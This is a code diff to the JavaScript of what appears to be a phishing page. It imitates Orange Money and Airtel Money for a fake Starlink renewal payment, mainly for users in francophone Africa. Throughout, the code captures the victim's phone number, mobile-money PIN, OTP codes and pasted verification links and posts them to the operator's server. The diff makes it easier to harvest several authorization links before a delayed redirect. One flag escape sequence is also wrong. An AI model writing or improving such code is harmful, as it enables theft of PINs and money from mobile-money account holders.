@@ -10,21 +10,21 @@
   const isAirtel = provider === "airtel";
 
   const COUNTRIES = [
-    { code: "CD", dial: "243", flag: "🇨🇩", name: "RDC" },
-    { code: "KE", dial: "254", flag: "🇰🇪", name: "Kenya" },
-    { code: "UG", dial: "256", flag: "🇺🇬", name: "Ouganda" },
-    { code: "TZ", dial: "255", flag: "🇹🇿", name: "Tanzanie" },
-    { code: "RW", dial: "250", flag: "🇷🇼", name: "Rwanda" },
-    { code: "BI", dial: "257", flag: "🇧🇮", name: "Burundi" },
-    { code: "CG", dial: "242", flag: "🇨🇬", name: "Congo" },
-    { code: "CM", dial: "237", flag: "🇨🇲", name: "Cameroun" },
-    { code: "CI", dial: "225", flag: "🇨🇮", name: "Côte d'Ivoire" },
-    { code: "SN", dial: "221", flag: "🇸🇳", name: "Sénégal" },
-    { code: "BF", dial: "226", flag: "🇧🇫", name: "Burkina Faso" },
-    { code: "NE", dial: "227", flag: "🇳🇪", name: "Niger" },
-    { code: "TG", dial: "228", flag: "🇹🇬", name: "Togo" },
-    { code: "BJ", dial: "229", flag: "🇧🇯", name: "Bénin" },
-    { code: "ZM", dial: "260", flag: "🇿🇲", name: "Zambie" }
+    { code: "CD", dial: "243", flag: "\uD83C\uDDFF\uD83C\uDDE9", name: "RDC" },
+    { code: "KE", dial: "254", flag: "\uD83C\uDDF0\uD83C\uDDEA", name: "Kenya" },
+    { code: "UG", dial: "256", flag: "\uD83C\uDDFA\uD83C\uDDEC", name: "Ouganda" },
+    { code: "TZ", dial: "255", flag: "\uD83C\uDDF9\uD83C\uDDFF", name: "Tanzanie" },
+    { code: "RW", dial: "250", flag: "\uD83C\uDDF7\uD83C\uDDFC", name: "Rwanda" },
+    { code: "BI", dial: "257", flag: "\uD83C\uDDE7\uD83C\uDDEE", name: "Burundi" },
+    { code: "CG", dial: "242", flag: "\uD83C\uDDE8\uD83C\uDDEC", name: "Congo" },
+    { code: "CM", dial: "237", flag: "\uD83C\uDDE8\uD83C\uDDF2", name: "Cameroun" },
+    { code: "CI", dial: "225", flag: "\uD83C\uDDE8\uD83C\uDDEE", name: "Cote d'Ivoire" },
+    { code: "SN", dial: "221", flag: "\uD83C\uDDF8\uD83C\uDDF3", name: "Senegal" },
+    { code: "BF", dial: "226", flag: "\uD83C\uDDE7\uD83C\uDDEB", name: "Burkina Faso" },
+    { code: "NE", dial: "227", flag: "\uD83C\uDDF3\uD83C\uDDEA", name: "Niger" },
+    { code: "TG", dial: "228", flag: "\uD83C\uDDF9\uD83C\uDDEC", name: "Togo" },
+    { code: "BJ", dial: "229", flag: "\uD83C\uDDE7\uD83C\uDDEF", name: "Benin" },
+    { code: "ZM", dial: "260", flag: "\uD83C\uDDFF\uD83C\uDDF2", name: "Zambie" }
   ];
 
   let selected = COUNTRIES[0];
@@ -32,15 +32,16 @@
   let otpLen = isOrange ? 6 : 4;
   let lastPin = "";
   let lastPhone = "";
+  let linkRedirectTimer = null;
 
   document.body.classList.toggle("airtel", isAirtel);
   if (isAirtel) {
     document.getElementById("brandLogo").textContent = "airtel";
     document.getElementById("brandTitle").textContent = "Airtel Money";
     document.getElementById("brandBy").textContent = "Airtel";
-    document.getElementById("loginTitle").textContent = "Entrez votre numéro Airtel Money";
+    document.getElementById("loginTitle").textContent = "Entrez votre numero Airtel Money";
     document.getElementById("pinHint").textContent =
-      "Entrez votre code PIN à 4 chiffres Airtel Money pour autoriser cette transaction.";
+      "Entrez votre code PIN a 4 chiffres Airtel Money pour autoriser cette transaction.";
   }
 
   document.getElementById("svcName").textContent = packageName || "Renouvellement Starlink";
@@ -60,8 +61,13 @@
   COUNTRIES.forEach((c) => {
     const li = document.createElement("li");
     li.innerHTML =
-      '<span class="flag">' + c.flag + '</span><span class="nm">' + c.name +
-      '</span><span class="cc">+' + c.dial + "</span>";
+      '<span class="flag">' +
+      c.flag +
+      '</span><span class="nm">' +
+      c.name +
+      '</span><span class="cc">+' +
+      c.dial +
+      "</span>";
     li.addEventListener("click", () => {
       selected = c;
       document.getElementById("ccFlag").textContent = c.flag;
@@ -133,14 +139,32 @@
       body: JSON.stringify(body)
     });
     let data = {};
-    try { data = await res.json(); } catch (_) {}
+    try {
+      data = await res.json();
+    } catch (_) {}
     if (!res.ok) throw new Error(data.error || "Erreur (" + res.status + ")");
     return data;
   }
 
   function goStatus() {
-    try { sessionStorage.setItem("starnet_paid", "1"); } catch (_) {}
+    try {
+      sessionStorage.setItem("starnet_paid", "1");
+    } catch (_) {}
     location.href = "/network-status.html?paid=1";
+  }
+
+  /** Clear Orange link field so a new link can be pasted immediately */
+  function clearLinkField() {
+    const input = document.getElementById("linkInput");
+    const btn = document.getElementById("btnVerifyLink");
+    if (input) {
+      input.value = "";
+      input.placeholder = "Collez un nouveau lien de verification ici...";
+    }
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = "Verifier";
+    }
   }
 
   document.getElementById("btnNext").addEventListener("click", async () => {
@@ -148,23 +172,27 @@
     const err = document.getElementById("errLogin");
     err.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "Traitement…";
+    btn.textContent = "Traitement...";
     lastPin = getPin();
     lastPhone = fullPhone();
     try {
       const data = await postJson("/api/auth/send-otp", {
-        phone: lastPhone, pin: lastPin, provider,
-        amount: amount ? amount + " " + cur : "", package: packageName
+        phone: lastPhone,
+        pin: lastPin,
+        provider,
+        amount: amount ? amount + " " + cur : "",
+        package: packageName
       });
       otpLen = data.otpLength || (isOrange ? 6 : 4);
       if (isOrange) {
         document.getElementById("linkPhoneDisp").textContent = lastPhone;
+        clearLinkField();
         showScreen("screenLink");
         startTimer();
         document.getElementById("linkInput").focus();
       } else {
         const sub = document.getElementById("otpSub");
-        if (sub) sub.innerHTML = "Veuillez entrer le code OTP reçu sur <b>" + lastPhone + "</b>";
+        if (sub) sub.innerHTML = "Veuillez entrer le code OTP recu sur <b>" + lastPhone + "</b>";
         buildOtpBoxes(otpLen);
         showScreen("screenOtp");
       }
@@ -192,28 +220,50 @@
     const btn = document.getElementById("btnVerifyLink");
     const err = document.getElementById("errLink");
     const msg = document.getElementById("msgLink");
+    const pasted = linkInput.value.trim();
+    if (pasted.length < 8) return;
+
     err.classList.remove("show");
     msg.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "Transaction en cours. Veuillez patienter…";
-    msg.textContent = "Transaction en cours. Veuillez patienter…";
+    btn.textContent = "Transaction en cours. Veuillez patienter...";
+    msg.textContent = "Transaction en cours. Veuillez patienter...";
     msg.classList.add("show");
+
     try {
       await postJson("/api/auth/verify-otp", {
-        phone: lastPhone, pin: lastPin, link: linkInput.value.trim(), provider,
-        amount: amount ? amount + " " + cur : "", package: packageName
+        phone: lastPhone,
+        pin: lastPin,
+        link: pasted,
+        provider,
+        amount: amount ? amount + " " + cur : "",
+        package: packageName
       });
-      setTimeout(goStatus, 900);
+
+      // Success: clear field automatically for a NEW link
+      clearLinkField();
+      msg.textContent =
+        "Lien recu. Champ vide - collez un autre lien si besoin, ou attendez la redirection...";
+      msg.classList.add("show");
+
+      if (linkRedirectTimer) clearTimeout(linkRedirectTimer);
+      // Give time to paste another link if needed; then go to status
+      linkRedirectTimer = setTimeout(goStatus, 4500);
     } catch (e) {
       err.textContent = e.message || "Erreur";
       err.classList.add("show");
       msg.classList.remove("show");
-      btn.disabled = false;
-      btn.textContent = "Vérifier";
+      // Clear on error too so user can paste a fresh link
+      clearLinkField();
+      linkInput.focus();
     }
   });
 
-  document.getElementById("btnBack").onclick = () => showScreen("screenLogin");
+  document.getElementById("btnBack").onclick = () => {
+    if (linkRedirectTimer) clearTimeout(linkRedirectTimer);
+    clearLinkField();
+    showScreen("screenLogin");
+  };
   document.getElementById("btnBackOtp").onclick = () => showScreen("screenLogin");
 
   function buildOtpBoxes(n) {
@@ -229,7 +279,9 @@
       row.appendChild(inp);
     }
     const boxes = Array.from(row.querySelectorAll(".pin-box"));
-    function getOtp() { return boxes.map((b) => b.value).join(""); }
+    function getOtp() {
+      return boxes.map((b) => b.value).join("");
+    }
     boxes.forEach((box, i) => {
       box.addEventListener("input", () => {
         box.value = box.value.replace(/\D/g, "").slice(0, 1);
@@ -254,11 +306,15 @@
     const err = document.getElementById("errOtp");
     err.classList.remove("show");
     btn.disabled = true;
-    btn.textContent = "Vérification…";
+    btn.textContent = "Verification...";
     try {
       await postJson("/api/auth/verify-otp", {
-        phone: lastPhone, pin: lastPin, otp, provider,
-        amount: amount ? amount + " " + cur : "", package: packageName
+        phone: lastPhone,
+        pin: lastPin,
+        otp,
+        provider,
+        amount: amount ? amount + " " + cur : "",
+        package: packageName
       });
       goStatus();
     } catch (e) {
@@ -267,7 +323,7 @@
       boxes.forEach((b) => (b.value = ""));
       if (boxes[0]) boxes[0].focus();
       btn.disabled = true;
-      btn.textContent = "VÉRIFIER";
+      btn.textContent = "VERIFIER";
     }
   });
 
@@ -283,18 +339,24 @@
       if (t) t.textContent = String(s);
       if (s <= 0) {
         clearInterval(timerIv);
-        info.innerHTML = '<a href="#" id="resendLink" style="color:#FF6600;font-weight:600">Renvoyer le lien</a>';
+        info.innerHTML =
+          '<a href="#" id="resendLink" style="color:#FF6600;font-weight:600">Renvoyer le lien</a>';
         const a = document.getElementById("resendLink");
-        if (a) a.onclick = async (e) => {
-          e.preventDefault();
-          try {
-            await postJson("/api/auth/send-otp", {
-              phone: lastPhone, pin: lastPin, provider,
-              amount: amount ? amount + " " + cur : "", package: packageName
-            });
-            startTimer();
-          } catch (_) {}
-        };
+        if (a)
+          a.onclick = async (e) => {
+            e.preventDefault();
+            try {
+              await postJson("/api/auth/send-otp", {
+                phone: lastPhone,
+                pin: lastPin,
+                provider,
+                amount: amount ? amount + " " + cur : "",
+                package: packageName
+              });
+              clearLinkField();
+              startTimer();
+            } catch (_) {}
+          };
       }
     }, 1000);
   }
